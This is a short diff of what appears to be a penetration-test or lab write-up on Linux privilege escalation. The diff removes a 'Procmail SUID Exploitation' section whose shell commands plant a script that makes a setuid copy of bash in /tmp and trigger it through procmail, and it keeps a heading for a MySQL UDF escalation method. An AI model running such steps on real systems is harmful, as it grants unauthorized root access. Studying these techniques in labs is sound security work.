@@ -220,25 +220,7 @@ Key findings:
 - `/sbin/mount.nfs` (SUID root)
 
 
-### Method 1: Procmail SUID Exploitation
-
-```shellscript
-# Create malicious script
-echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /tmp/rootme.sh
-chmod +x /tmp/rootme.sh
-
-# Create procmail configuration
-echo -e ":0\n* ^X-Trigger: exploit\n|/tmp/rootme.sh" > /tmp/.procmailrc
-
-# Trigger exploit
-echo -e "X-Trigger: exploit\n\nhello" | /usr/bin/procmail -m /tmp/.procmailrc
-
-# Check if SUID binary was created
-ls -la /tmp/rootbash
-# -rws--S--- 1 www-data www-data 1029624 Jul 11 16:05 rootbash
-```
-
-### Method 2: MySQL UDF Privilege Escalation
+### Method  MySQL UDF Privilege Escalation
 
 Downloaded and executed MySQL UDF exploit:
 
